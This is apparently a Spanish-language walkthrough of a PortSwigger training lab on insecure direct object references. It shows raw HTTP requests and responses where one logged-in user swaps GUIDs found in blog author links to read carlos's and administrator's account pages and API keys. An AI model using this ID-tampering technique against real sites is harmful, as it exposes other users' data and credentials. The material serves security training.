# 🤠 Laboratorio: ID de usuario controlado por parámetro de solicitud, con ID de usuario impredecibles

**Control de acceso**

Los controles de acceso están diseñados para evitar que los usuarios interactúen con datos o funciones para las que no tienen los permisos pertinentes. Debido al obvio impacto en la seguridad, los controles de acceso rotos son errores críticos en sí mismos. A menudo también brindan acceso a más superficie de ataque, lo que podría contener vulnerabilidades adicionales.

```python
// Some code

Laboratorio: ID de usuario controlado por parámetro de solicitud, con ID de usuario impredecibles GUID POR IDOR:

Escalada de privilegios horizontales:





ADMINISTRATOR:

https://0ae30015041cade281021b2c0075007f.web-security-academy.net/post?postId=10


<a href="/blogs?userId=ca937fba-d5a7-4f94-8497-6509ee79ff73">administrator</a>






CARLOS:

https://0ae30015041cade281021b2c0075007f.web-security-academy.net/post?postId=9


<a href="/blogs?userId=a3d143c6-eccb-4754-89d9-d681459faa56">carlos</a>





ARMAMOS LA SOLISITUD DEL PANEL DE LOGIN DE CARLOS:

https://0ae30015041cade281021b2c0075007f.web-security-academy.net/login?userId=a3d143c6-eccb-4754-89d9-d681459faa56








REQUEST DE LOGUEO DE WIENER:





POST /login HTTP/1.1
Host: 0ae30015041cade281021b2c0075007f.web-security-academy.net
Cookie: session=68DoHnWMYskJzDVy3nT2gkke3jIo9srO
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae30015041cade281021b2c0075007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae30015041cade281021b2c0075007f.web-security-academy.net/login?userId=a3d143c6-eccb-4754-89d9-d681459faa56
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close

csrf=ACZvdaLYY7ioRoheZg7eJSUdXwBWeGPx&username=wiener&password=peter









GET /my-account?id=e2553a62-9f4c-4c46-9e6f-da303f401209 HTTP/2
Host: 0ae30015041cade281021b2c0075007f.web-security-academy.net
Cookie: session=yZdTTKtB4jaBM5p8mT7fXiaQZgToXjoU
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ae30015041cade281021b2c0075007f.web-security-academy.net/login?userId=a3d143c6-eccb-4754-89d9-d681459faa56
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9







My Account
Your username is: wiener

Your API Key is: aKvEosczz6FBt1n9ZdcOsk6dV2Eb70yE








USUARIO CARLOS USAMOS SU GUID ENCONTRADO EN UN POST:


https://0ae30015041cade281021b2c0075007f.web-security-academy.net/my-account?id=a3d143c6-eccb-4754-89d9-d681459faa56




REQUEST:


GET /my-account?id=a3d143c6-eccb-4754-89d9-d681459faa56 HTTP/2
Host: 0ae30015041cade281021b2c0075007f.web-security-academy.net
Cookie: session=yZdTTKtB4jaBM5p8mT7fXiaQZgToXjoU
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9



RESPONSE:





HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3683

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter, with unpredictable user IDs</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User ID controlled by request parameter, with unpredictable user IDs
		</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' >Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=e2553a62-9f4c-4c46-9e6f-da303f401209">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: NeuLsZPE7JeEbBuGHvYTeGUaYpBgSYs8</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="FBB2dKuCPgBjBXxc8SBHkHFd1tGcMiKW">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>






SITIO WEB:


My Account
Your username is: carlos

Your API Key is: NeuLsZPE7JeEbBuGHvYTeGUaYpBgSYs8








USUARIO ADMINISTRATOR USAMOS SU GUID ENCONTRADO EN UN POST:



REQUEST:

GET /my-account?id=ca937fba-d5a7-4f94-8497-6509ee79ff73 HTTP/2
Host: 0ae30015041cade281021b2c0075007f.web-security-academy.net
Cookie: session=yZdTTKtB4jaBM5p8mT7fXiaQZgToXjoU
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9






RESPONSE:


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3690

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter, with unpredictable user IDs</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User ID controlled by request parameter, with unpredictable user IDs
		</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' >Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=e2553a62-9f4c-4c46-9e6f-da303f401209">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: administrator</p>
                        <div>Your API Key is: rBBsii27OCLtmvXkIS49Xkd5Rx5LZgI3</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="FBB2dKuCPgBjBXxc8SBHkHFd1tGcMiKW">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>


```
